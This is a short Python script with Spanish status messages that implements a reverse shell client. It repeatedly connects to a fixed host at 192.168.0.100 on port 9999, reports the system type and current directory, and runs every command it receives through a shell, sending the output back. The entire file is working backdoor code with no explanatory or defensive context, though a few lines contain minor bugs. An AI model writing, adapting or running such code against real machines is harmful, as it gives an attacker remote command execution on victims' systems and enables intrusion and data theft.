import socket
import os 
import subprocess
import platform
global sistema 
sistema= platform.system()
def shell():
    current_dir=os.getcwd()
    client.send(current_dir.encode(encoding="ascii"))
    while True:
        current_dir=os.getcwd()
        
        try:
            ans=client.recv(1024).decode("utf-8", 'ignore')
            if ans== "exit":
                break
            elif ans=="info":
                client.send(sistema.encode(encoding="ascii"))
                pass
            elif ans[:2] == 'cd' and len(ans)>2:
                try:
                    os.chdir(ans[3:])
                    result0=os.getcwd()
                    client.send(result0.encode(encoding="ascii"))
                except OSError:
                    client.send("1".encode(encoding="ascii"))
                    continue
            else:
                try:
                    proc=subprocess.Popen(ans, shell=True,
                        stdout=subprocess.PIPE,stderr=subprocess.PIPE, 
                        stdin=subprocess.PIPE)
                        
                    result=proc.stdout.read() + proc.stderr.read()
                    if len(result)==0:
                        error_command="Usted no ha introducido ningun comando"
                        client.send(error_command.encode(encoding="ascii"))
                    else:
                        client.send(result)
                except ConnectionAbortedError:
                    upclient
        except KeyboardInterrupt:
            client.connect(('192.168.0.100',9999))
def upclient():
    global client
    client=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try:
            client.connect(('192.168.0.100',9999))
            print("conexion establesida")
            shell()
        except ConnectionAbortedError:
            print("Se aborto la conexion")
            continue
        except ConnectionRefusedError:
            print("conecxion no encontrada")
            continue
        except TimeoutError:
            print("No se puede establecer una conexión ya que el equipo de destino denegó expresamente dicha conexión por tiempo")
            continue
        except OSError:
            upclient()
            break
    
upclient()
client.close